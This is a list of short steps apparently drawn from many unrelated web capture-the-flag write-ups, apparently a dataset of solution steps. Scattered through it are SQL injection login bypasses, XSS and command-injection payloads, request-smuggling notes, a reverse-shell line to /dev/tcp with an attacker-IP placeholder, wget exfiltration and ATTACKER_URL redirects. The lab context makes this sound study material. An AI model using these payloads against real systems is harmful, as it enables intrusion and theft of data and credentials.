    "Build a second-stage exploit that creates a WebSocket connection to the DevTools of the browser instance and sends JavaScript code to the browser instance using the Runtime.evaluate method",
    "Identified that ATS 7.1.1 is vulnerable to CVE-2018-8004, a request smuggling vulnerability due to a lack of validation for 'Content-Length' headers",
    "Executed an 'id' command to get user information",
    "Identified suspicious JavaScript named 'mec-frontend' and some settings related to a calendar",
    "Listed the directory using 'ls -al' command",
    "Change the value of 'admin_id' cookie to '1'",
    "The exploit page loads the challenge page as an 'iframe', waits for the API to be loaded, and then sends a 'postMessage' linking the generated CSS to the target page. This is added to a GitHub repository together with the CSS and deployed to GitHub pages under a '.jsapi.tech' subdomain.",
    "Access website hosting CTF.",
    "Obtained the flag from the webpage which reads: MCA{sms_2fa_is_bad_also}",
    "Set malicious cookies by having the user (admin) visit these URLs.",
    "Enter the discovered full token into the provided form field using the original token-generating IP address",
    "Identify two other POST-based XSS vectors, though not exploitable for admin privileg access",
    "Decoded the JWT to understand its format, found out that it has only user privileges.",
    "Identify that output content being checked for the presence of the string 'zer0pts', and devise a method to bypass it.",
    "Create a malicious input for the username to pull the details of the user with the proper role",
    "Receiving the server's response which includes the flag in the 'X-Localhost-Token' header.",
    "Realized 'os.exec' is blocked, therefore used 'os.StartProcess' instead;",
    "Identified that the web application might have an XPath injection vulnerability.",
    "Utilize '/proc/self/' directory to access reference to current working directory: 'cwd/'.",
    "Registered with the username 'm3ssap0' and password 'pwnd:true'",
    "Analyze the remaining check in the source code to bypass it",
    "Extracting 'flag.txt' from the gzip archive to reveal the flag",
    "Inspect the provided source code.",
    "Successfully retrieved the Flag",
    "Accessed '/admin' using the manipulated cookies",
    "The code gave the flag upon meeting the condition",
    "Recognize the calculator app filters out potential XSS attacks",
    "Determine that the `SQL` class contains a `$query` attribute used to generate a prepared statement.",
    "If the page content contains 'MCA{' (indicating the presence of a flag), the content is printed and the loop breaks",
    "Used directory traversal (../) to access the flag by manipulating the 'profile_img' attribute in the PHP object",
    "The script printed out the flag after successful execution",
    "Realized JSON payload cannot have spaces due to regex match and used '${IFS}' to get around this",
    "Extracted the page URL and learned that our submitted HTML was the only content present on the page. Also found that JavaScript couldn't read any cookies from the output of the payloads.",
    "Obtained the flag: 'CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}'",
    "Used `dirb/wordlists/common.txt` wordlist to find the endpoint.",
    "Realize that the access to '/admin/key' is needed to get the key",
    "Received a JWT session token in response",
    "Found the flag by testing one more exploit with the modified payload leading to '/flag' instead of '/etc/passwd'",
    "Generated sufficient money in one of the user accounts through this method",
    "Ran ffuf to fuzz the challenge site and find more logs using the wordlist",
    "Attempted to escape the 'shell_exec' function and run shell commands.",
    "Craft a '?cat=random\"onerror=\"alert`` img' request to render '<img src=\"/images/error.jpg\" alt=\"selected category random\"onerror=\"alert``\" />' and execute an XSS attack",
    "Generate a webpage with the XSS payload by sending it to the website",
    "Review of the database.py file revealed a hint suggesting input was not sanitized",
    "Executed an HTTP request using the base constructed, trying to enumerate DB tables",
    "Concluded that '/pleb' and '/pleb.' work like domain Top Level Domains (TLDs).",
    "Began analysing the server code files, specifically, app.js.",
    "Crafted a malicious Java serialized object with a large 'value' to speed up the process",
    "Using the available 'fread' and 'fopen' functions, crafted a payload to read 'config.php'",
    "Couldn't find any flaws in the OTP verification logic hence proceeded to find vulnerabilities in other functions",
    "Looking at the source code, identified that the `database.sql` file contains password hashes for a manager and admin user.",
    "Explore the possibility of detecting a client-side error when exceeding Chrome's maximum URL length (2MB)",
    "Create a new HTML script element with id 'program', language 'json', and type 'importmap'",
    "Implemented haversine formula to calculate the great-circle distance between locations based on their latitudes and longitudes",
    "Download app.py and examine the render function",
    "Opened source code of the webpage and searched for the flag format",
    "Using the visible SQL query as a hint, input 'or 1=1;--' is entered into the 'pass' field to bypass login",
    "The email's input validation was bypassed through injection, as it only required the email to start validly, allowing any characters afterwards",
    "Analysed PHP code and identified it will execute 'cat' command when specified in the GET request parameter 'f'.",
    "Identify that /set.php allows setting the 'theme' value in the session to any string using the 'theme' GET query parameter.",
    "The final payload was `http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22`.",
    "Modify permissions of s3scanner.py to make it executable using 'chmod u+x s3scanner.py'",
    "Download and review the robots.txt file",
    "Research on whether the HTTP headers can manipulate the processing of URL path by Gunicorn",
    "Step 9: The 'flag' value updates with the successful character, and it repeats the process until the end of the flag is found.",
    "Prepare a LibreOffice word document named 'poc.odt'",
    "But if we take a look carefully we can see that the values of 'salt' and 'hash' are being taken from the JSON request body",
    "Got the admin's token.",
    "Using 'grep' command to search for 'child_process' in all files of '/usr/local/lib/node_modules'.",
    "Identified that the user agent is `wkhtmltoimage` through the request captured",
    "Extracted the flag, which turned out to be 'cybrics{imagesaresocoolicandrawonthem}'.",
    "Observed the cookie 'not_admin' with a value of '1' after form submission",
    "Change the hashed value in the session_id cookie to correspond to the username 'admin'",
    "Constructed a base to perform SQL injection",
    "Once the new cookie has been inputted, press 'login' on the login page to access the site and find the flag",
    "Understood from the challenge description that it might involve a JWT key confusion attack.",
    "Used the page string as '' and die(show_source('templates/flag.php')) or '' to cause the source of 'flag.php' file to be revealed",
    "Initialized CTF task and noticed the name 'We will we will Shock You' as a hint towards Shellshock vulnerability.",
    "Log in with the found user: username: 'root' and password: 'jjLLgTGk3uif2rKBVwqH'",
    "Blacklisted characters and command length limit of 15 characters identified from the code",
    "Found that the URL is encrypted using `str_rot_pass($url, $key);`.",
    "Author defined a conditional statement, if the challenge is 'taxi union', certain variables are initialized with specific values",
    "Found an admin login page",
    "Recognized the necessity to set certain cookies to gain access to '/admin'",
    "Input {{ state.flag }} (you could also do {{ state }} and get the flag)",
    "Visited the website and got redirected to '/?file=wc.php'",
    "Attempt a brute-forcing approach by trying out all remaining expected values.",
    "Visited the URL: https://space.sdc.tf/",
    "Test with some classic SQL Injection payloads.",
    "Spot that during authentication, 'get_user_info' method of the User class in [loaddata.py](loaddata.py) uses the 'f()' method on the 'username' field which can be exploited for login",
    "Use this final URL to solicit a response from the server, successfully bypassing the checks in the source code",
    "Observed incoming requests on the server set up in step 4",
    "Researching online, find that the tripcode is generated from a snippet of futaba-ng code",
    "Uploaded a file with the .tpl extension and a random content for identification",
    "Used LFI again to access and display the code of the 'flag' resource in the 'deleted' folder",
    "Explored the website functionality and discovered an image rendering feature that places text onto a T-shirt image",
    "Analyze the 'changelog.js' script finding that it includes a 'execSync' call with a possible command injection.",
    "Noted that certain characters and strings were restricted like space, 'AND', 'OR', etc.",
    "Submitted the script in the URL to obtain the flag",
    "Understood that to reach this code path, 'npm_config_global' needs to be polluted to a truthy value",
    "Tried submitting possible answers using wordplay with no success",
    "Removed intermediate files created during the process.",
    "Navigate to the S3Scanner directory using 'cd S3Scanner/'",
    "Reverse-engineered the key using the ciphertext and original plaintext.",
    "Then received an error for missing launch time, added a random timestamp to the POST request body to understand the format",
    "The execution enters a while loop, where the code iterates over every character in the domain to build up the 'payload'",
    "Used `Access-Control-Allow-Origin: *` header to avoid CORS issues.",
    "Created an SQL payload to get the length of the flag by trying out different lengths in place of '$LENGTH$'",
    "Used provided hexadecimal values to generate two different strings with the same md5 hash",
    "Step 6: The payload is sent to the target URL via POST request. The data content for the request is constructed dynamically with the key-value pair where the key is retrieved from the 'key' variable and the value is the payload.",
    "Adjusted the offsets in the PDF with the 'mutool clean' command to correct any discrepancies.",
    "Used the signature from the first PDF on the second PDF",
    "Checked the output reflected in the `style.css` file after executing `whoami >> src/static/style.css`",
    "Bypassed the SQL Injection protection through MySQL comments that are treated like spaces",
    "Third step: Discovered that an oracle could be used to determine whether the flag obtained is correct.",
    "Source code also shows if a POST request is made with 'shell' as a parameter, it echoes the input and sends it to the `shellme()` function, as long as it keeps a 1000 characters limit",
    "Concatenate possible characters to the end of the flag",
    "Ran code using URL 'http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27'",
    "Inserted the file name in the URL as: http://172.17.15.117:443/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png",
    "Perform a prototype pollution on the web server by sending a POST request to the '/api/tet/list' endpoint with a JSON payload having '__proto__' polluted with a command injection payload in the 'data'.",
    "Discovered that a successful HTTP request smuggling attack led to the server sending a second request with admin headers.",
    "Realize the challenge of reaching the Python microservice that only accepts the PUT method while the Traefik proxy only allows the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Observe that the password is not given directly but might be related to the hash.",
    "Parsed the shapefile using geopandas",
    "Create a function 'get_passwords' that generates all possible combinations of YYYYMM from the years 1900 to 2019 and months from 1 to 13",
    "Understood that this GET call would be interpreted like '$BACKEND/admin', which led to retrieving 'flag.txt'.",
    "Running this binary inside the docker container to increase the privileges, and subsequently reading the second flag",
    "Interpreted a template string in Python's format function with request.args as the argument",
    "Retrieve and capture the flag 'LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}' as the output of the successful exploit",
    "Retrieve the flag from the server",
    "Log in to the application using the manipulated cookie to get the flag.",
    "Created the new PDF files 'collision1.pdf' and 'collision2.pdf' with the predetermined prefix and the cleaned, manipulated PDF data.",
    "Checked the network tab and found a response header",
    "Identified behavior: if the host is not found or the URL is invalid, a specific message is returned.",
    "Determined that the website is a Flask application running on a MySQL database, suspected possible SQL Injection",
    "The payload we insert is a URL, caused by clicking on it, generates a password change request for the admin account with a new password.",
    "Change the 'User-Agent' header to that of a Google bot",
    "Step 5: In each iteration, the author forms SQL Injection payload with progressively appended characters from the 'domain'.",
    "Received a full introspection response from the /graphql endpoint",
    "Initialized a server to exploit the above vulnerability.",
    "Use the curl command to POST the page",
    "Defined final payload using 'wget' and command substitution to exfiltrate the '/readflag' output",
    "Found that http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php lists all HTML files",
    "Located Maria's session ID by querying the 'nxf8_sessions' table for session IDs where 'user_id' is 5.",
    "Acknowledge that the challenge is to bypass origin check by embedding the iframe and forcing a 'null' origin",
    "Identified that it was a Jinja2 Template Injection challenge",
    "Identified Apache Traffic Server (ATS) 7.1.1 in the 'Server' response header",
    "Received different responses from the '/two/' endpoint with 'PUT' and 'CONNECT' HTTP verbs.",
    "Used factorization of 1337 which is 7*191 to create the first payload",
    "Acquire the User-Agent string for Internet Explorer 6.01",
    "Identify a specific replace function that changes markdown format images into HTML image tags, but does not sanitize the 'alt' parameter.",
    "Get response confirming successful exposure of /etc/passwd file.",
    "Combined all password parts into a single string",
    "Clicked the admin button to retrieve the flag",
    "Looked more into Jinja2 and found the 'safe' filter that renders unescaped HTML.",
    "Identify the algorithm mentioned in the cookie value and apply it to the wifi nonces captured",
    "Send the malicious JWT to the server",
    "Arrived at a support page featuring a POST request capability and a login page",
    "Uploaded the gif with the crafted filename to the application.",
    "Inserted an image reference with an 'onerror' attribute to trigger JavaScript code to send the document cookies to an attacker-controlled server",
    "Manipulated the link used in the requests.get operation via CAPTCHA parameter, excluding the existing private key parameter through '#' and forced the debugging private key.",
    "Start at a login/register page",
    "Reduced the number of characters in the payload by improving upon the first solution",
    "Recognize that pop-ups from a sandboxed page inherit sandbox attributes, unless 'allow-popups-to-escape-sandbox' is set",
    "Confirmed the exploit worked and was able to run shell commands.",
    "URL-encoded the payload again to bypass double URL decoding by server",
    "Used `1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');` and ``1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');`` to retrieve data from tables.",
    "Made the inference that if debugging is enabled, it would likely be on the development server rather than the production server",
    "It notes that the function uses strlen(), which will truncate any shellcode at null bytes",
    "Encode new cookie value into base64",
    "Used PHP system() function to execute commands",
    "The username is reflected back into the username field (its `value` attribute) after failed authentication",
    "Get the uploaded HTML file link from the webpage and report it, tricking admin into opening the page and thus executing the JS script silently",
    "Download the source code provided by the challenge",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Created a Python script to automate the trial and error process to exploit this type juggling loophole",
    "Fetched headers and PHP session ID from /out/save.txt.",
    "Realize that while eval executes the command, it does not display the output and thus use print to display the output",
    "Analyzed the HTML source code to discover an interesting comment (?source=1)",
    "Accessed the website showing the status report of the combat robot and a command prompt to execute commands.",
    "'database.js' lets you add and read items from the database. The query variable control is possible via the website, but SQL injection is unsuccessful.",
    "Use the workaround to parse the contents of '/etc/passwd' to the results",
    "Write a Python script that automates this process and will easily exfiltrate all password characters via blind SQL injection",
    "Created two accounts, with one of the usernames being '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
    "Decided to control the 'window.name' variable to exploit the vulnerability",
    "Visit '/api/flag' with modified token.",
    "Attempt to refactor the code and limit the try range.",
    "Successfully gained admin privilege and access to an admin button",
    "In the 'get_comments' function within the [loaddata.py](loaddata.py) file, a code snippet that prints 'self.__dict__' if a comment text contains a format string like '{rating}' is found",
    "Leverage a backend server to eliminate unsuccessful queries and zero in on the correct flag",
    "Send a GET request to the URL using the modified User-Agent using Python's requests library",
    "Discovered an SQL injection vulnerability by using ' in the username parameter.",
    "Tried to become admin, but the server sent hints or funny responses",
    "Understand that you can convert a string to an array of chars in Javascript using the clause '[...p]'.",
    "Managed to access the admin's note but faced a password prompt.",
    "Use the vulnerability to search the entire file system for any file named 'flag'",
    "Observe from user session that the identifier is stored and the session cookie was set to Lax",
    "After successful exploitation, receive in response an 'image' encoded in base64",
    "Analyzed the certificate and discovered it was created for the host 138.247.13.115.xip.io",
    "Created and uploaded the new PHP exploit",
    "Identify that the structure of the script can be seen as something like '(x, y)()'.",
    "Identified a heavily filtered error-based blind sql injection",
    "Discovering the secret to be 'supersecret'.",
    "Realize that there is no way around the exploit page's origin needing to start with 'http://localhost', unless a browser's zero-day allows a malicious webpage to spoof Origin headers",
    "Recognize that the web application allows image uploads and displays them in a gallery",
    "Found /private.php which was inaccessible but likely contained the hidden flag.",
    "Execute the payload and successfully bypass the login function due to successful SQL injection",
    "Understood that TODO notes of users can be read by enumerating URLs in a certain format",
    "Leaked the source code of PHP with a payload",
    "Understood that the script converts the base64 string 'SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9' and stores it in local storage with the key 'flag'",
    "Combined output filter with 'SetEnv LD_PRELOAD' to execute code when running gzip",
    "Requested '/FLAG' endpoint instead of '/flag' to bypass the validation and obtained the flag",
    "JSON body is sent to the server which contains username and password",
    "Injected the crafted payload into a request in either the top text or bottom text",
    "Tested different file extensions and found .phtml extension, which also executes PHP code, was not being filtered",
    "First step: Analyzed the challenge website where notes could be created and searched.",
    "Dump the related WebSocket packets for further analysis (decoding).",
    "An insight into the problematic code in the /redirect shows a potential for XSS injection but this is blocked by the Content-Security-Policy header.",
    "Look for potential vulnerabilities or points of entry, taking note of any suspect templates in the webpage's code, such as an 'update store description' template.",
    "Learn about the Scroll-To-Text-Fragment (STTF) which is a Chromium feature allowing to scroll to a specific portion of the page using a text snippet in the URL",
    "Set the 'view options' setting and run arbitrary javascript with the 'outputFunctionName' option",
    "Reported the findings on the platform provided for the CTF Challenge.",
    "Performed internet searches concerning Alan Turing's life to gain the necessary information to answer the recovery questions",
    "Formulated a payload, which excluded the existing private key and forced the debugging private key.",
    "Noticed a line in the scan result showing: '+ /.env: .env file found. The .env file may contain credentials.'",
    "Examine the source code of the page by enabling the 'debug' option",
    "Inspecting the proxy reveals that it makes a request to the backend with a 'secret' token added to cookies",
    "Passed the final payload '/admin' to extract the admin cookie 'password', which was the flag",
    "Scanned the 10.0.42.0/24 network and discovered valid endpoints at 10.0.42.2 and 10.0.42.200.",
    "Found a JavaScript feature called Template Literals that can be used to call functions without parentheses",
    "Injected a command to list all files and directories using '127.0.0.1; ls -al' in the IP address field",
    "Read '/proc/self/environ' to retrieve the flag",
    "Encountered challenges with navigating up directories due to the `basedir` restriction.",
    "Discovered a hint suggesting that the 'shell_exec' function is running, which executes a command in a shell and returns the output.",
    "Navigated to the uploaded webshell and ran the command cat /flag.txt",
    "The 'Edit profile' section lets users edit their own name",
    "Restarted the container as attempts to open a reverse shell modified the PHP file and caused problems.",
    "Bruteforced the value of 'x' by submitting RCE payload with different 'x' values until a shell was received",
    "Further observed that an error does not occur if an apostrophe is used in both fields",
    "Identified a 'role' attribute that could possibly be changed to escalate privileges",
    "Analyze the HTML response and find that 'news' string is reflected twice in the JavaScript",
    "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'.",
    "Confirm the success of the attack when a new follow request from admin appears",
    "Print the constructed command to confirm correct formatting and content.",
    "Realized necessity to create raw HTTP requests to hijack the $whoareyou variable",
    "Saw that the Markdown was parsed using 'marked' and 'DOMPurify'.",
    "Understand that the 'Buffer' needs to be 16 bytes, meaning you need at least 32 characters in your 'fqdn'",
    "Verified that the token is successfully signed and the 'language' parameter was indeed changed to 'flag.txt'",
    "Used format of '..://alien.somewhere.meepwn.team/../..//index.php' request, causing Apache2 to crash due to ':' in directory name",
    "Used PHP system() function to execute commands",
    "Find out that the second obstacle is HTTP request smuggling between ATS and Waitress",
    "Created an LFI payload with a form that contains an XML part that substitutes an entity 'myExternalEntity' with '/etc/passwd', hinting at XXE exploitation",
    "Identified 'b' as the character that successfully returned the flag",
    "Experimented with `1' ORDER BY` commands to deduce the number of columns based on error return.",
    "Access the obfuscated code at http://challenges.auctf.com:30022/authentication.js",
    "Use 'Host: app@ATTACKER_URL' to bypass the validation",
    "Step 2: Para meters and values such as 'domain', 'check', 'key', and 'column' are initialized to be manipulated later.",
    "Identified the HTML injection vector via 'profile.html' template.",
    "Step 8: If the check is successful, it indicates that the payload was able to pass through SQL Injection leading to valid login and the iterated character is added to 'flag'.",
    "Obtained the flag from within the target server.",
    "Find the flag at the bottom of the returned results.",
    "Crafted an XSS payload to get the cookies of the admins",
    "All tables are listed using the query '123' UNION SELECT name, sql, null from sqlite_master;--'",
    "The error message then indicated pumpId was missing, added a random pump ID from earlier /fuel endpoint response",
    "A restriction bypass is found using a \"CREATE TABLE ... SELECT\" SQL statement which can transfer the results from the select statement into a new table.",
    "Use the tamper script with SQLMap to dump the database.",
    "The requests after reaching the backend server were modified such that the first request had 'Content-Length: 0' and the second request was 'GET /flag HTTP/1.1' as intended initially",
    "We notice that the anchor element allows for a 'ping' attribute. This creates an opportunity since 'ping' sends a POST request when the link is clicked.",
    "Used the SQL injection to enumerate the columns of the flag table",
    "Dumped data from 'startup_users' table by using the SQL query and concatenating usernames using the GROUP_CONCAT function",
    "Access the /flag using the token as a cookie to get the flag",
    "The goal consists of writing the cgi header (Content-type: text/html), sending the SQL query to the FD 4 (MySQL server), reading the response from this FD, and finally, writing the received response",
    "Tried uploading a valid PHP file",
    "Used the 'view XML' tab on the web interface to review the XML return, successfully extracting the flag from /var/www.",
    "URL-encoded the payload and updated length of URL string according to the previous string replacement.",
    "Used 'php://filter' again and de-coded base64 strings to see the source code of 'wc.php'",
    "Review the given PHP code to understand what it does",
    "Noted that the password for the portal is being checked by the script",
    "Checked robots.txt and discovered a new path /server-status",
    "Send another GET request to /jwtlogin with the crafted JWT in the `Authorization` header",
    "Study the commit history, find a commit with the message 'Fix auth!!!'",
    "Analyzed the notes app's JavaScript source code",
    "The `name` is written to memory, regardless of whether it passes the XSS check in `validateJared()`. We can exploit this by first 'inserting' our XSS payload then overwriting the `HEAD->name` to the address the XSS payload. `getNameAtIndex(0)` will then return the XSS payload when displaying the table.",
    "Determine the code checks file extensions for uploaded files, only allowing 'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx'.",
    "Understood that a regex filter restricts characters that can be included in the 'f' parameter.",
    "Found a workaround for using '.' by employing the 'attr' filter",
    "Fetched the flag from the `/api/flag` endpoint.",
    "Used SQL Injection to read 'username' from 'users'; discovered from 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,username,null,null,null,null/**/from/**/users'",
    "Formulate the final URL by injecting a NULL byte and the necessary characters",
    "Identified the Content-Type as 'text/xsl', indicating potential for Cross-Site Scripting",
    "Located an image tag with a suspicious URL parameter labelled 'flag'",
    "This will translate to the query: SELECT * FROM users WHERE username='admin';#",
    " Discovered that 'preg_replace' is vulnerable to RCE (Remote Code Execution) using '/e'",
    "Retrieved the flag 'CSR{sometimes_it's_really_hard_to_create_good_flags}'",
    "Used the above to execute commands to retrieve the contents of the flagged file located at /secret/safe/flag.png",
    "Combined both parts of the flag to solve the challenge.",
    "Set the theme to '<?php phpinfo() ?>', to confirm the vulnerability and the input reflection.",
    "Send this crafted URL to the admin to get the flag",
    "Identified a flag table in the database",
    "Constructed a `exploit.html` file with an iframe whose source is `http://localhost:3000/render?url=http://api:8000/`.",
    "With the private key located, create a token and apply the signature to it. The token is built using NodeJS and the 'jsonwebtoken' library. The token is signed with the 'user' payload set to 'admin', the retrieved private key, and the 'RS256' algorithm",
    "After receiving error, add 'messi' to JSON object as a key",
    "Appended the obtained payload to '/readflag' command in the 'f' GET parameter to finally get the flag 'grey{r35p3c7_70_b45h_m4573r_0dd14e9bc3172d16}'.",
    "Visited '/?file=checkpass.php' and realized the page contained some secret potentially usable code",
    "Understand that while the namedtuple and tuple are immutable, if they contain mutable objects, those can still be modified in place.",
    "Identify that URL of the created webpage is a base64 encoded form from the content of the page",
    "Open '/g00d_old_mus1c.php' path to reveal the flag",
    "Attempted to access localhost on the URL capture service and was successful",
    "Used 'php://filter' to view the source of 'checkpass.php' and discovered the password 'w0rdc0unt123'",
    "Passed a PHP command for the 'name' parameter (which is a command to display the ID of the current process) ",
    "Navigated to 'Sources' tab in the Inspect Element tool",
    "Observed the result and noticed the Linux logo was gone from the page",
    "Send the payload",
    "Wrote a new PHP exploit using 'scandir' and 'file_get_contents' to browse through files in the '/etc' directory and find the flag which is meant to be in a file in that directory",
    "Confirmed that when Angular tries to match up the path, it parses the URL created from 'PROTOCOL + HOST + PATH'.",
    "Examine the blacklist filter code to discern it replaces certain blacklisted characters and commands.",
    "Crafted a malicious HTTP request including a special character between 'Transfer-Encoding:' and 'chunked' for a possible request smuggling attack.",
    "Change the User-Agent header in the request to 'Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)'",
    "Decoded the `chatmessage` widget using Remote Flutter Widgets package.",
    "We can control `HEAD->name` by overwriting it in the next `malloc()` call in `insertSorted()`.",
    "Discovered that it allows for a domain-literal format, which permits just about any printable ASCII character.",
    "Examine the page's source code and find that the login process is performed via a JavaScript file (scripts/login.js).",
    "Given that the server runs php-cgi, to conduct the MySQL query, a php-cgi header has to first be written",
    "Identified an interesting functionality of the app that modifies the `services` object when POST-ing JSON to the `/change_status` endpoint using the `fast-json-patch`",
    "Attempted to alter the User-Agent during authentication and received a SQL error, therefore SQL injection via User-Agent string was possible.",
    "Analyzed the downloaded source code, discovered a conditional statement that sets a cookie with the true flag if certain values are present",
    "During the submission of comment, a two-step process of inserting the comment like a preview and then validating and inserting into the database is observed",
    "Upon running this command, retrieve the flag 'dsc{1_l0v3_sw3d3n}'",
    "Identified XSS vulnerability in the feedback feature of the site enabling CSRF attacks on the admin",
    "Checked the source code, found CSP settings",
    "Unquoted and cleaned up the cookie values within the Python script",
    "Discorded a 'robots.txt' file at '?file=robots.txt' revealing the existence of 'checkpass.php'",
    "Attempted '127.0.0.1;ls .' in the URL but only 'index.php' was returned.",
    "Logged in as dennisb@uupeye.edu",
    "Logged into the admin account with the new password",
    "Test the code with 'flag{randomString}' to determine suitable regular expressions",
    "Confirmed SQLite injection was possible by manipulating the 'moneys=' parameter and seeing the results in the green text",
    "Entered new user_id and password",
    "Accessed the meme generator web application",
    "Used the OpenSSL tool to decode the Bitcoin Wallet password, providing the AES ECB key and hex string as input.",
    "Observe that 'notes.count' function is unauthenticated",
    "From receiving server, decode the field flag to extract the second flag",
    "The payload used was one that executed a command to find the flag and redirected it to a file in the invoices directory",
    "Brute-forced user-agent strings in burp suite according to the above conclusion, specifically using version 43.0",
    "Duplicate an image file and rename it to indicate it contains a shell",
    "Located a valid credential which was 'aaron@cgau.sdc.tf : weakpassword'.",
    "The source HTML indicates a requirement to read the flag from a file located at /sweatin/to/the/oldies/flag.txt.",
    "Tried to inject '127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1' to open a reverse shell but failed.",
    "Discovered the full flag one character at a time",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account', which needs 'Link to profile' and 'Message'",
    "Logged into the website using provided credentials and encountered a message saying browser is unsupported",
    "Send the modified request back to the server",
    "Use this technique to bruteforce every character of the flag",
    "Leveraged X-Accel-Redirect, which enables access to the internal directive by acting as a rewrite rule, to access the '/admin' directory.",
    "Chose to target the '/uberadmin' directory next. Found a potential Off-by-Slash bug where nginx concatenates alias directives with location directives.",
    "Choose two strings from the magic hash list that have a length of 15 or more",
    "Discovered the latitude and longitude of the most frequently occurring src_ip",
    "Located 'flag.txt' using './findaas flag.txt'",
    "Appended this payload '?payload=directory`flag`' to the URL of the webpage",
    "Using an exploit script to generate the payload",
    "Attempt to find current working directory to spot flag file.",
    "If the guessed character is not in the password, the loop continues with the next character",
    "Successfully restore the source code files on local machine",
    "Create a new token using the JWT secret and the altered payload (admin username and 'true' admin status).",
    "Formulated a GET request that accessed the subclass information",
    "A different intended solution involved the use of 'PerformanceLongTaskTiming API' to identify if the search was taking more than 50ms.",
    "Race with other players in the game to overwrite '.bashrc' file with their payload",
    "Recognize that the function for generating a token is creating it by injecting variables directly into a string, rather than by using object properties.",
    "Used the found object to access the 'app.secret_key' value in the 'Flask.current_app' module",
    "Navigated to the disallowed path /ingen/ and discovered a text file named flag.txt.",
    "Triggered an error that resulted in the printing of the flag",
    "Received a custom error with the flag as a response, resulting in successful completion of the challenge",
    "Note that the page wasn't setting any X-XSS-Protection header so the XSS-Auditor in Chrome 74 is set to mode=filter meaning any reflected XSS will be filtered and not executed",
    "Send a customized request body where the 'isAdmin' field is set to 'true' to get the flag",
    "Sent a request to /save.php with var1 and var2 parameters using 'Transfer-Encoding: chunked' and 'Content-Length:53' headers.",
    "Injected payload for basic XSS execution with DOM Clobbering",
    "Craft attack URL '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'",
    "Upload the modified DOCX file",
    "Alternatively, wrote a python script that automates the process of sending the POST request, extracting the cookie and getting the flag",
    "Visited the challenge website",
    "Explored the potential of achieving RCE through exploiting the `ejs` module, by leveraging the `constructor/prototype/outputFunctionName`",
    "Captured the login request to utilize in a SQL Injection attempt",
    "Note that the 'username' from the form inputs has undergone rot13 encoding to appear in the decoded JWT.",
    "Create a Python script to exploit the vulnerability and get Remote Code Execution (RCE)",
    "Injected a classic SQL Injection payload (' or 1=1 -- ) into the username and password fields.",
    "Automate the submission of different text fragments and for each text fragment, detect if a callback is received",
    "Checked search function for potential vulnerabilities",
    "Attempted SQL login bypass using burpsuite with the following payload: admin@uupeye.edu' or '1'='1",
    "Automated a bruteforce attack with a Python script that loads a template including the query for each possible character",
    "Encode the JWT by setting the algorithm to 'none'",
    "Identifying the server's functioning port and host from the Python script's main execution function.",
    "Analyzed the HTML source code, found the endpoint of the QR code service",
    "Received a PNG image from the 'CONNECT /two/' request.",
    "Identify that Meteor is being used to fetch data from a MongoDB backend",
    "Modify the function addCaptcha() in your devtools, remove the loop() function to stop the captchas from moving",
    "Attempt to display the flag within the response body by using client-sided redirects",
    "Tried the previously discovered SQL injection, found that it still works",
    "Attempted basic payloads for NoSQL injection with unsuccessful results",
    "Identified two additional subdomains through the certificate search",
    "Successfully exploited the path traversal vulnerability using a triple URL-encoded payload",
    "Finally, managed to win the race and acquire the flag",
    "Accessed URL http://138.68.228.12/?is_debug=1 obtained from source code to get index.php source code",
    "The script sends a GET request to the target URL with each possible 'likeCookie' value (from 0 to 19). For each request, it checks if the response text contains 'LITCTF{' (indicating a CTF flag).",
    "Recognize the naive 'script remover' that removes script tags which can be bypassed by using 'onload' event handlers",
    "Accessed the target website's CSS source by entering 'view-source:https://no-right-click.hsc.tf/useless-file.css' in the browser's address bar.",
    "By appending `?source` to the index.php of the site, the source code was made visible",
    "Review the battle endpoint in which fame can hypothetically be increased, but as LOYALTY_SYSTEM_ACTIVE is set to False, it is impossible.",
    "Found an interesting endpoint '/dogooo/runcmd' enabling remote shell functionality that was blocked due to 'seccomp' filter preventing 'execve'",
    "Ran the modified exploit script and obtained the flag.",
    "Perform another POST request, this time with a 'flag' variable set based on the response",
    "Dumped the '.git' directory.",
    "Identified SQL Injection vulnerability",
    "Create a Python script that iterates over a specified alphabet to test characters against the SQL injection",
    "Open Python on the command line tool.",
    "Accessed the given URL, to review the source code of the homepage.",
    "Identify that the code is reading an HTTP header and using it to construct a file path",
    "Identified the application was protected by DOMPurify in version 2.0.16.",
    "Accessed the web application and submitted a text content to a remote S3 bucket defining a GUID for the key and then retrieved the same text content via the GUID.",
    "Download the provided PHP files as part of the CTF challenge",
    "Identified that the Apache server version 2.4.49 is operating on port 12380",
    "Found the second part of the flag '_th1s_w3bs1t3}' in an HTML comment",
    "Viewed homepage source to find a comment prompting the user to 'get the page'",
    "Found a way to bypass the localhost blacklist by using an alternative representation of '127.0.0.1', like '0177.0.0.1'.",
    "Export or send the content of flag.txt to a webhook.",
    "Obtained the flag as 'rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}'",
    "The bcrypt hash was known from the PHP manual and revealed that the password was 'rasmuslerdorf'.",
    "Notice that users are redirected if the queried amount exceeds their actual balance.",
    "Identified 2 HTTP request smuggling vulnerabilities.",
    "Understood the website allowed changing the theme via a URL parameter `theme='value'`",
    "Recognized the challenge to be related to cookie manipulation",
    "Understand that the upload functionality is vulnerable as it does not verify the content of the image or convert it to remove unwanted content",
